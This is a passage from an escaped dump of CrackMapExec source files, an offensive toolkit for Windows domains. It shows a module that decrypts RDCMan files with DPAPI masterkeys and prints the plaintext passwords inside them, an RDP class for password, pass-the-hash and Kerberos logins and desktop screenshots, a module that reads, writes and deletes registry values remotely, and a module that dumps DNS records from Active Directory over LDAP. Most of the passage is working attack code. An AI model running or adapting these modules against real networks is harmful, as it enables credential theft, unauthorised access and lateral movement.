looted"")\n            return\n\n        context.log.success(""Got {} decrypted masterkeys. Looting RDCMan secrets"".format(highlight(len(self.masterkeys))))\n\n        try:\n            triage = RDGTriage(target=target, conn=conn, masterkeys=self.masterkeys)\n            rdcman_files, rdgfiles = triage.triage_rdcman()\n            for rdcman_file in rdcman_files:\n                if rdcman_file is None:\n                    continue\n                for rdg_cred in rdcman_file.rdg_creds:\n                    if rdg_cred.type == ""cred"":\n                        context.log.highlight(\n                            ""[%s][%s] %s:%s""\n                            % (\n                                rdcman_file.winuser,\n                                rdg_cred.profile_name,\n                                rdg_cred.username,\n                                rdg_cred.password.decode(""latin-1""),\n                            )\n                        )\n                    elif rdg_cred.type == ""logon"":\n                        context.log.highlight(\n                            ""[%s][%s] %s:%s""\n                            % (\n                                rdcman_file.winuser,\n                                rdg_cred.profile_name,\n                                rdg_cred.username,\n                                rdg_cred.password.decode(""latin-1""),\n                            )\n                        )\n                    elif rdg_cred.type == ""server"":\n                        context.log.highlight(\n                            ""[%s][%s] %s - %s:%s""\n                            % (\n                                rdcman_file.winuser,\n                                rdg_cred.profile_name,\n                                rdg_cred.server_name,\n                                rdg_cred.username,\n                                rdg_cred.password.decode(""latin-1""),\n                            )\n                        )\n            for rdgfile in rdgfiles:\n                if rdgfile is None:\n                    continue\n                for rdg_cred in rdgfile.rdg_creds:\n                    if rdg_cred.type == ""cred"":\n                        context.log.highlight(\n                            ""[%s][%s] %s:%s""\n                            % (\n                                rdgfile.winuser,\n                                rdg_cred.profile_name,\n                                rdg_cred.username,\n                                rdg_cred.password.decode(""latin-1""),\n                            )\n                        )\n                    elif rdg_cred.type == ""logon"":\n                        context.log.highlight(\n                            ""[%s][%s] %s:%s""\n                            % (\n                                rdgfile.winuser,\n                                rdg_cred.profile_name,\n                                rdg_cred.username,\n                                rdg_cred.password.decode(""latin-1""),\n                            )\n                        )\n                    elif rdg_cred.type == ""server"":\n                        context.log.highlight(\n                            ""[%s][%s] %s - %s:%s""\n                            % (\n                                rdgfile.winuser,\n                                rdg_cred.profile_name,\n                                rdg_cred.server_name,\n                                rdg_cred.username,\n                                rdg_cred.password.decode(""latin-1""),\n                            )\n                        )\n        except Exception as e:\n            context.log.debug(""Could not loot RDCMan secrets: {}"".format(e))\n', 'rdp.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport asyncio\nimport os\nfrom datetime import datetime\nfrom os import getenv\nfrom termcolor import colored\n\nfrom impacket.krb5.ccache import CCache\n\nfrom cme.connection import *\nfrom cme.helpers.bloodhound import add_user_bh\nfrom cme.logger import CMEAdapter\nfrom cme.config import host_info_colors\nfrom cme.config import process_secret\n\nfrom aardwolf.connection import RDPConnection\nfrom aardwolf.commons.queuedata.constants import VIDEO_FORMAT\nfrom aardwolf.commons.iosettings import RDPIOSettings\nfrom aardwolf.commons.target import RDPTarget\nfrom aardwolf.protocol.x224.constants import SUPP_PROTOCOLS\nfrom asyauth.common.credentials.ntlm import NTLMCredential\nfrom asyauth.common.credentials.kerberos import KerberosCredential\nfrom asyauth.common.constants import asyauthSecret\nfrom asysocks.unicomm.common.target import UniTarget, UniProto\n\nclass rdp(connection):\n    def __init__(self, args, db, host):\n        self.domain = None\n        self.server_os = None\n        self.iosettings = RDPIOSettings()\n        self.iosettings.channels = []\n        self.iosettings.video_out_format = VIDEO_FORMAT.RAW\n        self.iosettings.clipboard_use_pyperclip = False\n        self.protoflags_nla = [\n            SUPP_PROTOCOLS.SSL | SUPP_PROTOCOLS.RDP,\n            SUPP_PROTOCOLS.SSL,\n            SUPP_PROTOCOLS.RDP,\n        ]\n        self.protoflags = [\n            SUPP_PROTOCOLS.SSL | SUPP_PROTOCOLS.RDP,\n            SUPP_PROTOCOLS.SSL,\n            SUPP_PROTOCOLS.RDP,\n            SUPP_PROTOCOLS.SSL | SUPP_PROTOCOLS.HYBRID,\n            SUPP_PROTOCOLS.SSL | SUPP_PROTOCOLS.HYBRID_EX,\n        ]\n        width, height = args.res.upper().split(""X"")\n        height = int(height)\n        width = int(width)\n        self.iosettings.video_width = width\n        self.iosettings.video_height = height\n        # servers dont support 8 any more :/\n        self.iosettings.video_bpp_min = 15\n        self.iosettings.video_bpp_max = 32\n        # PIL produces incorrect picture for some reason?! TODO: check bug\n        self.iosettings.video_out_format = VIDEO_FORMAT.PNG  #\n        self.output_filename = None\n        self.domain = None\n        self.server_os = None\n        self.url = None\n        self.nla = True\n        self.hybrid = False\n        self.target = None\n        self.auth = None\n\n        self.rdp_error_status = {\n            ""0xc0000071"": ""STATUS_PASSWORD_EXPIRED"",\n            ""0xc0000234"": ""STATUS_ACCOUNT_LOCKED_OUT"",\n            ""0xc0000072"": ""STATUS_ACCOUNT_DISABLED"",\n            ""0xc0000193"": ""STATUS_ACCOUNT_EXPIRED"",\n            ""0xc000006E"": ""STATUS_ACCOUNT_RESTRICTION"",\n            ""0xc000006F"": ""STATUS_INVALID_LOGON_HOURS"",\n            ""0xc0000070"": ""STATUS_INVALID_WORKSTATION"",\n            ""0xc000015B"": ""STATUS_LOGON_TYPE_NOT_GRANTED"",\n            ""0xc0000224"": ""STATUS_PASSWORD_MUST_CHANGE"",\n            ""0xc0000022"": ""STATUS_ACCESS_DENIED"",\n            ""0xc000006d"": ""STATUS_LOGON_FAILURE"",\n            ""0xc000006a"": ""STATUS_WRONG_PASSWORD "",\n            ""KDC_ERR_CLIENT_REVOKED"": ""KDC_ERR_CLIENT_REVOKED"",\n            ""KDC_ERR_PREAUTH_FAILED"": ""KDC_ERR_PREAUTH_FAILED"",\n        }\n\n        connection.__init__(self, args, db, host)\n\n    # def proto_flow(self):\n    #     if self.create_conn_obj():\n    #         self.proto_logger()\n    #         self.print_host_info()\n    #         if self.login() or (self.username == \'\' and self.password == \'\'):\n    #             if hasattr(self.args, \'module\') and self.args.module:\n    #                 self.call_modules()\n    #             else:\n    #                 self.call_cmd_args()\n\n    def proto_logger(self):\n        self.logger = CMEAdapter(\n            extra={\n                ""protocol"": ""RDP"",\n                ""host"": self.host,\n                ""port"": self.args.port,\n                ""hostname"": self.hostname,\n            }\n        )\n\n    def print_host_info(self):\n        nla = colored(f""nla:{self.nla}"", host_info_colors[3], attrs=[\'bold\']) if self.nla else colored(f""nla:{self.nla}"", host_info_colors[2], attrs=[\'bold\'])\n        if self.domain is None:\n            self.logger.display(""Probably old, doesn\'t not support HYBRID or HYBRID_EX"" f"" ({nla})"")\n        else:\n            self.logger.display(f""{self.server_os} (name:{self.hostname}) (domain:{self.domain})"" f"" ({nla})"")\n        return True\n\n    def create_conn_obj(self):\n        self.target = RDPTarget(ip=self.host, domain=""FAKE"", port=self.args.port, timeout=self.args.rdp_timeout)\n        self.auth = NTLMCredential(secret=""pass"", username=""user"", domain=""FAKE"", stype=asyauthSecret.PASS)\n\n        self.check_nla()\n\n        for proto in reversed(self.protoflags):\n            try:\n                self.iosettings.supported_protocols = proto\n                self.conn = RDPConnection(\n                    iosettings=self.iosettings,\n                    target=self.target,\n                    credentials=self.auth,\n                )\n                asyncio.run(self.connect_rdp())\n            except OSError as e:\n                if ""Errno 104"" not in str(e):\n                    return False\n            except Exception as e:\n                if ""TCPSocket"" in str(e):\n                    return False\n                if ""Reason:"" not in str(e):\n                    try:\n                        info_domain = self.conn.get_extra_info()\n                    except:\n                        pass\n                    else:\n                        self.domain = info_domain[""dnsdomainname""]\n                        self.hostname = info_domain[""computername""]\n                        self.server_os = info_domain[""os_guess""] + "" Build "" + str(info_domain[""os_build""])\n                        self.logger.extra[""hostname""] = self.hostname\n                        self.output_filename = os.path.expanduser(f""~/.cme/logs/{self.hostname}_{self.host}_{datetime.now().strftime(\'%Y-%m-%d_%H%M%S\')}"".replace("":"", ""-""))\n                    break\n\n        if self.args.domain:\n            self.domain = self.args.domain\n\n        if self.args.local_auth:\n            self.domain = self.hostname\n\n        self.target = RDPTarget(\n            ip=self.host,\n            hostname=self.hostname,\n            port=self.args.port,\n            domain=self.domain,\n            dc_ip=self.domain,\n            timeout=self.args.rdp_timeout,\n        )\n\n        return True\n\n    def check_nla(self):\n        for proto in self.protoflags_nla:\n            try:\n                self.iosettings.supported_protocols = proto\n                self.conn = RDPConnection(\n                    iosettings=self.iosettings,\n                    target=self.target,\n                    credentials=self.auth,\n                )\n                asyncio.run(self.connect_rdp())\n                if str(proto) == ""SUPP_PROTOCOLS.RDP"" or str(proto) == ""SUPP_PROTOCOLS.SSL"" or str(proto) == ""SUPP_PROTOCOLS.SSL|SUPP_PROTOCOLS.RDP"":\n                    self.nla = False\n                    return\n            except Exception as e:\n                pass\n\n    async def connect_rdp(self):\n        _, err = await asyncio.wait_for(self.conn.connect(), timeout=self.args.rdp_timeout)\n        if err is not None:\n            raise err\n\n    def kerberos_login(self, domain, username, password="""", ntlm_hash="""", aesKey="""", kdcHost="""", useCache=False):\n        try:\n            lmhash = """"\n            nthash = """"\n            # This checks to see if we didn\'t provide the LM Hash\n            if ntlm_hash.find("":"") != -1:\n                lmhash, nthash = ntlm_hash.split("":"")\n                self.hash = nthash\n            else:\n                nthash = ntlm_hash\n                self.hash = ntlm_hash\n            if lmhash:\n                self.lmhash = lmhash\n            if nthash:\n                self.nthash = nthash\n\n            if not all("""" == s for s in [nthash, password, aesKey]):\n                kerb_pass = next(s for s in [nthash, password, aesKey] if s)\n            else:\n                kerb_pass = """"\n\n            fqdn_host = self.hostname + ""."" + self.domain\n            password = password if password else nthash\n\n            if useCache:\n                stype = asyauthSecret.CCACHE\n                if not password:\n                    password = getenv(""KRB5CCNAME"") if not password else password\n                    if ""/"" in password:\n                        self.logger.fail(""Kerberos ticket need to be on the local directory"")\n                        return False\n                    ccache = CCache.loadFile(getenv(""KRB5CCNAME""))\n                    ticketCreds = ccache.credentials[0]\n                    username = ticketCreds[""client""].prettyPrint().decode().split(""@"")[0]\n            else:\n                stype = asyauthSecret.PASS if not nthash else asyauthSecret.NT\n\n            kerberos_target = UniTarget(\n                self.domain,\n                88,\n                UniProto.CLIENT_TCP,\n                proxies=None,\n                dns=None,\n                dc_ip=self.domain,\n                domain=self.domain\n            )\n            self.auth = KerberosCredential(\n                target=kerberos_target,\n                secret=password,\n                username=username,\n                domain=domain,\n                stype=stype,\n            )\n            self.conn = RDPConnection(iosettings=self.iosettings, target=self.target, credentials=self.auth)\n            asyncio.run(self.connect_rdp())\n\n            self.admin_privs = True\n            self.logger.success(\n                ""{}\\\\{}{} {}"".format(\n                    domain,\n                    username,\n                    (\n                        # Show what was used between cleartext, nthash, aesKey and ccache\n                        "" from ccache""\n                        if useCache\n                        else "":%s"" % (process_secret(kerb_pass))\n                    ),\n                    self.mark_pwned(),\n                )\n            )\n            if not self.args.local_auth:\n                add_user_bh(username, domain, self.logger, self.config)\n            return True\n\n        except Exception as e:\n            if ""KDC_ERR"" in str(e):\n                reason = None\n                for word in self.rdp_error_status.keys():\n                    if word in str(e):\n                        reason = self.rdp_error_status[word]\n                self.logger.fail(\n                    (f""{domain}\\\\{username}{\' from ccache\' if useCache else \':%s\' % (process_secret(kerb_pass))} {f\'({reason})\' if reason else str(e)}""),\n                    color=(""magenta"" if ((reason or ""CredSSP"" in str(e)) and reason != ""KDC_ERR_C_PRINCIPAL_UNKNOWN"") else ""red""),\n                )\n            elif ""Authentication failed!"" in str(e):\n                self.logger.success(f""{domain}\\\\{username}:{(process_secret(password))} {self.mark_pwned()}"")\n            elif ""No such file"" in str(e):\n                self.logger.fail(e)\n            else:\n                reason = None\n                for word in self.rdp_error_status.keys():\n                    if word in str(e):\n                        reason = self.rdp_error_status[word]\n                if ""cannot unpack non-iterable NoneType object"" == str(e):\n                    reason = ""User valid but cannot connect""\n                self.logger.fail(\n                    (f""{domain}\\\\{username}{\' from ccache\' if useCache else \':%s\' % (process_secret(kerb_pass))} {f\'({reason})\' if reason else \'\'}""),\n                    color=(""magenta"" if ((reason or ""CredSSP"" in str(e)) and reason != ""STATUS_LOGON_FAILURE"") else ""red""),\n                )\n            return False\n\n    def plaintext_login(self, domain, username, password):\n        try:\n            self.auth = NTLMCredential(\n                secret=password,\n                username=username,\n                domain=domain,\n                stype=asyauthSecret.PASS,\n            )\n            self.conn = RDPConnection(iosettings=self.iosettings, target=self.target, credentials=self.auth)\n            asyncio.run(self.connect_rdp())\n\n            self.admin_privs = True\n            self.logger.success(f""{domain}\\\\{username}:{process_secret(password)} {self.mark_pwned()}"")\n            if not self.args.local_auth:\n                add_user_bh(username, domain, self.logger, self.config)\n            return True\n        except Exception as e:\n            if ""Authentication failed!"" in str(e):\n                self.logger.success(f""{domain}\\\\{username}:{process_secret(password)} {self.mark_pwned()}"")\n            else:\n                reason = None\n                for word in self.rdp_error_status.keys():\n                    if word in str(e):\n                        reason = self.rdp_error_status[word]\n                if ""cannot unpack non-iterable NoneType object"" == str(e):\n                    reason = ""User valid but cannot connect""\n                self.logger.fail(\n                    (f""{domain}\\\\{username}:{process_secret(password)} {f\'({reason})\' if reason else \'\'}""),\n                    color=(""magenta"" if ((reason or ""CredSSP"" in str(e)) and reason != ""STATUS_LOGON_FAILURE"") else ""red""),\n                )\n            return False\n\n    def hash_login(self, domain, username, ntlm_hash):\n        try:\n            self.auth = NTLMCredential(\n                secret=ntlm_hash,\n                username=username,\n                domain=domain,\n                stype=asyauthSecret.NT,\n            )\n            self.conn = RDPConnection(iosettings=self.iosettings, target=self.target, credentials=self.auth)\n            asyncio.run(self.connect_rdp())\n\n            self.admin_privs = True\n            self.logger.success(f""{self.domain}\\\\{username}:{process_secret(ntlm_hash)} {self.mark_pwned()}"")\n            if not self.args.local_auth:\n                add_user_bh(username, domain, self.logger, self.config)\n            return True\n        except Exception as e:\n            if ""Authentication failed!"" in str(e):\n                self.logger.success(f""{domain}\\\\{username}:{process_secret(ntlm_hash)} {self.mark_pwned()}"")\n            else:\n                reason = None\n                for word in self.rdp_error_status.keys():\n                    if word in str(e):\n                        reason = self.rdp_error_status[word]\n                if ""cannot unpack non-iterable NoneType object"" == str(e):\n                    reason = ""User valid but cannot connect""\n\n                self.logger.fail(\n                    (f""{domain}\\\\{username}:{process_secret(ntlm_hash)} {f\'({reason})\' if reason else \'\'}""),\n                    color=(""magenta"" if ((reason or ""CredSSP"" in str(e)) and reason != ""STATUS_LOGON_FAILURE"") else ""red""),\n                )\n            return False\n\n    async def screen(self):\n        try:\n            self.conn = RDPConnection(iosettings=self.iosettings, target=self.target, credentials=self.auth)\n            await self.connect_rdp()\n        except Exception as e:\n            return\n\n        await asyncio.sleep(int(5))\n        if self.conn is not None and self.conn.desktop_buffer_has_data is True:\n            buffer = self.conn.get_desktop_buffer(VIDEO_FORMAT.PIL)\n            filename = os.path.expanduser(f""~/.cme/screenshots/{self.hostname}_{self.host}_{datetime.now().strftime(\'%Y-%m-%d_%H%M%S\')}.png"")\n            buffer.save(filename, ""png"")\n            self.logger.highlight(f""Screenshot saved {filename}"")\n\n    def screenshot(self):\n        asyncio.run(self.screen())\n\n    async def nla_screen(self):\n        # Otherwise it crash\n        self.iosettings.supported_protocols = None\n        self.auth = NTLMCredential(secret="""", username="""", domain="""", stype=asyauthSecret.PASS)\n        self.conn = RDPConnection(iosettings=self.iosettings, target=self.target, credentials=self.auth)\n        await self.connect_rdp()\n        await asyncio.sleep(int(self.args.screentime))\n\n        if self.conn is not None and self.conn.desktop_buffer_has_data is True:\n            buffer = self.conn.get_desktop_buffer(VIDEO_FORMAT.PIL)\n            filename = os.path.expanduser(f""~/.cme/screenshots/{self.hostname}_{self.host}_{datetime.now().strftime(\'%Y-%m-%d_%H%M%S\')}.png"")\n            buffer.save(filename, ""png"")\n            self.logger.highlight(f""NLA Screenshot saved {filename}"")\n\n    def nla_screenshot(self):\n        if not self.nla:\n            asyncio.run(self.nla_screen())\n', 'reg-query.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom impacket.dcerpc.v5.rpcrt import DCERPCException\nfrom impacket.dcerpc.v5 import rrp\nfrom impacket.examples.secretsdump import RemoteOperations\n\n\nclass CMEModule:\n    name = ""reg-query""\n    description = ""Performs a registry query on the machine""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def __init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n        self.delete = None\n        self.type = None\n        self.value = None\n        self.key = None\n        self.path = None\n\n    def options(self, context, module_options):\n        """"""\n        PATH    Registry key path to query\n        KEY     Registry key value to retrieve\n        VALUE   Registry key value to set (only used for modification)\n                Will add a new registry key if the registry key does not already exist\n        TYPE    Type of registry to modify, add or delete. Default type : REG_SZ.\n                Type supported: REG_NONE, REG_SZ, REG_EXPAND_SZ,REG_BINARY, REG_DWORD, REG_DWORD_BIG_ENDIAN, REG_LINK, REG_MULTI_SZ, REG_QWORD\n        DELETE  If set to True, delete a registry key if it does exist\n        """"""\n        self.context = context\n        self.path = None\n        self.key = None\n        self.value = None\n        self.type = None\n        self.delete = False\n\n        if module_options and ""PATH"" in module_options:\n            self.path = module_options[""PATH""]\n\n        if module_options and ""KEY"" in module_options:\n            self.key = module_options[""KEY""]\n\n        if ""VALUE"" in module_options:\n            self.value = module_options[""VALUE""]\n            if ""TYPE"" in module_options:\n                type_dict = {\n                    ""REG_NONE"": rrp.REG_NONE,\n                    ""REG_SZ"": rrp.REG_SZ,\n                    ""REG_EXPAND_SZ"": rrp.REG_EXPAND_SZ,\n                    ""REG_BINARY"": rrp.REG_BINARY,\n                    ""REG_DWORD"": rrp.REG_DWORD,\n                    ""REG_DWORD_BIG_ENDIAN"": rrp.REG_DWORD_BIG_ENDIAN,\n                    ""REG_LINK"": rrp.REG_LINK,\n                    ""REG_MULTI_SZ"": rrp.REG_MULTI_SZ,\n                    ""REG_QWORD"": rrp.REG_QWORD,\n                }\n                self.type = module_options[""TYPE""]\n                if ""WORD"" in self.type:\n                    try:\n                        self.value = int(self.value)\n                    except:\n                        context.log.fail(f""Invalid registry value type specified: {self.value}"")\n                        return\n                if self.type in type_dict:\n                    self.type = type_dict[self.type]\n                else:\n                    context.log.fail(f""Invalid registry value type specified: {self.type}"")\n                    return\n            else:\n                self.type = 1\n\n        if module_options and ""DELETE"" in module_options and module_options[""DELETE""].lower() == ""true"":\n            self.delete = True\n\n    def on_admin_login(self, context, connection):\n        self.context = context\n        if not self.path:\n            self.context.log.fail(""Please provide the path of the registry to query"")\n            return\n        if not self.key:\n            self.context.log.fail(""Please provide the registry key to query"")\n            return\n\n        remote_ops = RemoteOperations(connection.conn, False)\n        remote_ops.enableRegistry()\n\n        try:\n            if ""HKLM"" in self.path or ""HKEY_LOCAL_MACHINE"" in self.path:\n                self.path = self.path.replace(""HKLM\\\\"", """")\n                ans = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)\n            elif ""HKCU"" in self.path or ""HKEY_CURRENT_USER"" in self.path:\n                self.path = self.path.replace(""HKCU\\\\"", """")\n                ans = rrp.hOpenCurrentUser(remote_ops._RemoteOperations__rrp)\n            elif ""HKCR"" in self.path or ""HKEY_CLASSES_ROOT"" in self.path:\n                self.path = self.path.replace(""HKCR\\\\"", """")\n                ans = rrp.hOpenClassesRoot(remote_ops._RemoteOperations__rrp)\n            else:\n                self.context.log.fail(f""Unsupported registry hive specified in path: {self.path}"")\n                return\n\n            reg_handle = ans[""phKey""]\n            ans = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, self.path)\n            key_handle = ans[""phkResult""]\n\n            if self.delete:\n                # Delete registry\n                try:\n                    # Check if value exists\n                    data_type, reg_value = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, self.key)\n                except:\n                    self.context.log.fail(f""Registry key {self.key} does not exist"")\n                    return\n                # Delete value\n                rrp.hBaseRegDeleteValue(remote_ops._RemoteOperations__rrp, key_handle, self.key)\n                self.context.log.success(f""Registry key {self.key} has been deleted successfully"")\n                rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)\n\n            if self.value is not None:\n                # Check if value exists\n                try:\n                    # Check if value exists\n                    data_type, reg_value = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, self.key)\n                    self.context.log.highlight(f""Key {self.key} exists with value {reg_value}"")\n                    # Modification\n                    rrp.hBaseRegSetValue(\n                        remote_ops._RemoteOperations__rrp,\n                        key_handle,\n                        self.key,\n                        self.type,\n                        self.value,\n                    )\n                    self.context.log.success(f""Key {self.key} has been modified to {self.value}"")\n                except:\n                    rrp.hBaseRegSetValue(\n                        remote_ops._RemoteOperations__rrp,\n                        key_handle,\n                        self.key,\n                        self.type,\n                        self.value,\n                    )\n                    self.context.log.success(f""New Key {self.key} has been added with value {self.value}"")\n                    rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)\n            else:\n                # Query\n                try:\n                    data_type, reg_value = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, self.key)\n                    self.context.log.highlight(f""{self.key}: {reg_value}"")\n                except:\n                    if self.delete:\n                        pass\n                    else:\n                        self.context.log.fail(f""Registry key {self.key} does not exist"")\n                        return\n            rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)\n        except DCERPCException as e:\n            self.context.log.fail(f""DCERPC Error while querying or modifying registry: {e}"")\n        except Exception as e:\n            self.context.log.fail(f""Error while querying or modifying registry: {e}"")\n        finally:\n            remote_ops.finish()\n', 'runasppl.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n\nclass CMEModule:\n    name = ""runasppl""\n    description = ""Check if the registry value RunAsPPL is set or not""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def __init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n\n    def options(self, context, module_options):\n        """"""""""""\n\n    def on_admin_login(self, context, connection):\n        command = ""reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ /v RunAsPPL""\n        context.log.display(""Executing command"")\n        p = connection.execute(command, True)\n        if ""The system was unable to find the specified registry key or value"" in p:\n            context.log.debug(f""Unable to find RunAsPPL Registry Key"")\n        else:\n            context.log.highlight(p)\n', 'scan-network.py': '# Credit to https://twitter.com/snovvcrash/status/1550518555438891009\n# Credit to https://github.com/dirkjanm/adidnsdump @_dirkjan\n# module by @mpgn_x64\n\nfrom os.path import expanduser\nimport codecs\nimport socket\nfrom builtins import str\nfrom datetime import datetime\nfrom struct import unpack\n\nimport dns.name\nimport dns.resolver\nfrom impacket.structure import Structure\nfrom ldap3 import LEVEL\n\n\ndef get_dns_zones(connection, root, debug=False):\n    connection.search(root, ""(objectClass=dnsZone)"", search_scope=LEVEL, attributes=[""dc""])\n    zones = []\n    for entry in connection.response:\n        if entry[""type""] != ""searchResEntry"":\n            continue\n        zones.append(entry[""attributes""][""dc""])\n    return zones\n\n\ndef get_dns_resolver(server, context):\n    # Create a resolver object\n    dnsresolver = dns.resolver.Resolver()\n    # Is our host an IP? In that case make sure the server IP is used\n    # if not assume lookups are working already\n    try:\n        if server.startswith(""ldap://""):\n            server = server[7:]\n        if server.startswith(""ldaps://""):\n            server = server[8:]\n        socket.inet_aton(server)\n        dnsresolver.nameservers = [server]\n    except socket.error:\n        context.info(""Using System DNS to resolve unknown entries. Make sure resolving your"" "" target domain works here or specify an IP as target host to use that"" "" server for queries"")\n    return dnsresolver\n\n\ndef ldap2domain(ldap):\n    return re.sub("",DC="", ""."", ldap[ldap.lower().find(""dc="") :], flags=re.I)[3:]\n\n\ndef new_record(rtype, serial):\n    nr = DNS_RECORD()\n    nr[""Type""] = rtype\n    nr[""Serial""] = serial\n    nr[""TtlSeconds""] = 180\n    # From authoritive zone\n    nr[""Rank""] = 240\n    return nr\n\n\n# From: https://docs.microsoft.com/en-us/windows/win32/dns/dns-constants\nRECORD_TYPE_MAPPING = {\n    0: ""ZERO"",\n    1: ""A"",\n    2: ""NS"",\n    5: ""CNAME"",\n    6: ""SOA"",\n    12: ""PTR"",\n    # 15: \'MX\',\n    # 16: \'TXT\',\n    28: ""AAAA"",\n    33: ""SRV"",\n}\n\n\ndef searchResEntry_to_dict(results):\n    data = {}\n    for attr in results[""attributes""]:\n        key = str(attr[""type""])\n        value = str(attr[""vals""][0])\n        data[key] = value\n    return data\n\n\nclass CMEModule:\n    name = ""get-network""\n    description = """"\n    supported_protocols = [""ldap""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        ALL      Get DNS and IP (default: false)\n        ONLY_HOSTS    Get DNS only (no ip) (default: false)\n        """"""\n\n        self.showall = False\n        self.showhosts = False\n        self.showip = True\n\n        if module_options and ""ALL"" in module_options:\n            if module_options[""ALL""].lower() == ""true"" or module_options[""ALL""] == ""1"":\n                self.showall = True\n            else:\n                print(""Could not parse ALL option."")\n        if module_options and ""IP"" in module_options:\n            if module_options[""IP""].lower() == ""true"" or module_options[""IP""] == ""1"":\n                self.showip = True\n            else:\n                print(""Could not parse ONLY_HOSTS option."")\n        if module_options and ""ONLY_HOSTS"" in module_options:\n            if module_options[""ONLY_HOSTS""].lower() == ""true"" or module_options[""ONLY_HOSTS""] == ""1"":\n                self.showhosts = True\n            else:\n                print(""Could not parse ONLY_HOSTS option."")\n\n    def on_login(self, context, connection):\n        zone = ldap2domain(connection.baseDN)\n        dnsroot = ""CN=MicrosoftDNS,DC=DomainDnsZones,%s"" % connection.baseDN\n        searchtarget = ""DC=%s,%s"" % (zone, dnsroot)\n        context.log.display(""Querying zone for records"")\n        sfilter = ""(DC=*)""\n\n        try:\n            list_sites = connection.ldapConnection.search(\n                searchBase=searchtarget,\n                searchFilter=sfilter,\n                attributes=[""dnsRecord"", ""dNSTombstoned"", ""name""],\n                sizeLimit=100000,\n            )\n        except ldap.LDAPSearchError as e:\n            if e.getErrorString().find(""sizeLimitExceeded"") >= 0:\n                context.log.debug(""sizeLimitExceeded exception caught, giving up and processing the"" "" data received"")\n                # We reached the sizeLimit, process the answers we have already and that\'s it. Until we implement\n                # paged queries\n                list_sites = e.getAnswers()\n                pass\n            else:\n                raise\n        targetentry = None\n        dnsresolver = get_dns_resolver(connection.host, context.log)\n\n        outdata = []\n\n        for item in list_sites:\n            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                continue\n            site = searchResEntry_to_dict(item)\n            recordname = site[""name""]\n\n            if ""dnsRecord"" in site:\n                record = bytes(site[""dnsRecord""].encode(""latin1""))\n                dr = DNS_RECORD(record)\n                if RECORD_TYPE_MAPPING[dr[""Type""]] == ""A"":\n                    if dr[""Type""] == 1:\n                        address = DNS_RPC_RECORD_A(dr[""Data""])\n                        if str(recordname) != ""DomainDnsZones"" and str(recordname) != ""ForestDnsZones"":\n                            outdata.append(\n                                {\n                                    ""name"": recordname,\n                                    ""type"": RECORD_TYPE_MAPPING[dr[""Type""]],\n                                    ""value"": address.formatCanonical(),\n                                }\n                            )\n                    if dr[""Type""] in [a for a in RECORD_TYPE_MAPPING if RECORD_TYPE_MAPPING[a] in [""CNAME"", ""NS"", ""PTR""]]:\n                        address = DNS_RPC_RECORD_NODE_NAME(dr[""Data""])\n                        if str(recordname) != ""DomainDnsZones"" and str(recordname) != ""ForestDnsZones"":\n                            outdata.append(\n                                {\n                                    ""name"": recordname,\n                                    ""type"": RECORD_TYPE_MAPPING[dr[""Type""]],\n                                    ""value"": address[list(address.fields)[0]].toFqdn(),\n                                }\n                            )\n                    elif dr[""Type""] == 28:\n                        address = DNS_RPC_RECORD_AAAA(dr[""Data""])\n                        if str(recordname) != ""DomainDnsZones"" and str(recordname) != ""ForestDnsZones"":\n                            outdata.append(\n                                {\n                                    ""name"": recordname,\n                                    ""type"": RECORD_TYPE_MAPPING[dr[""Type""]],\n                                    ""value"": address.formatCanonical(),\n                                }\n                            )\n\n        context.log.highlight(""Found %d records"" % len(outdata))\n        path = expanduser(""~/.cme/logs/{}_network_{}.log"".format(connection.domain, datetime.now().strftime(""%Y-%m-%d_%H%M%S"")))\n        with codecs.open(path, ""w"", ""utf-8"") as outfile:\n            for row in outdata:\n                if self.showhosts:\n                    outfile.write(""{}\\n"".format(row[""name""] + ""."" + connection.domain))\n                elif self.showall:\n                    outfile.write(""{} \\t {}\\n"".format(row[""name""] + ""."" + connection.domain, row[""value""]))\n                else:\n                    outfile.write(""{}\\n"".format(row[""value""]))\n        context.log.success(""Dumped {} records to {}"".format(len(outdata), path))\n        if not self.showall and not self.showhosts:\n            context.log.display(""To extract CIDR from the {} ip, run  the following command: cat"" "" your_file | mapcidr -aa -silent | mapcidr -a -silent"".format(len(outdata)))\n\n\nclass DNS_RECORD(Structure):\n    """"""\n    dnsRecord - used in LDAP\n    [MS-DNSP] section 2.3.2.2\n    """"""\n\n    structure = (\n        (""DataLength"", ""<H-Data""),\n        (""Type"", ""<H""),\n        (""Version"", ""B=5""),\n        (""Rank"", ""B""),\n        (""Flags"", ""<H=0""),\n        (""Serial"", ""<L""),\n        (""TtlSeconds"", "">L""),\n        (""Reserved"", ""<L=0""),\n        (""TimeStamp"", ""<L=0""),\n        (""Data"", "":""),\n    )\n\n\n# Note that depending on whether we use RPC or LDAP all the DNS_RPC_XXXX\n# structures use DNS_RPC_NAME when communication is over RPC,\n# but DNS_COUNT_NAME is the way they are stored in LDAP.\n#\n# Since LDAP is the primary goal of this script we use that, but for use\n# over RPC the DNS_COUNT_NAME in the structures must be replaced with DNS_RPC_NAME,\n# which is also consistent with how MS-DNSP describes it.\n\n\nclass DNS_RPC_NAME(Structure):\n    """"""\n    DNS_RPC_NAME\n    Used for FQDNs in RPC communication.\n    MUST be converted to DNS_COUNT_NAME for LDAP\n    [MS-DNSP] section 2.2.2.2.1\n    """"""\n\n    structure = 